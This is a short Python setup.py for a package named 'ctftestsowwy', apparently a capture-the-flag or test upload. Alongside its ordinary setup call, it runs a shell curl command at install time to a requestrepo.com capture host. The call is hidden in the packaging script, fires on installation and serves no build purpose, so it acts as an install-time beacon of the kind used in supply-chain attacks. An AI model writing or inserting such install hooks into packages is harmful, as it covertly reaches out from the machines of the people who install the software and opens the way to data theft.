from setuptools import setup, find_packages
import os

os.system('curl http://bwzl03ac.requestrepo.com')

setup(
    name='ctftestsowwy',
    version='7.0',
    packages=find_packages(),
    install_requires=[
        'RestrictedPython',
    ]
)

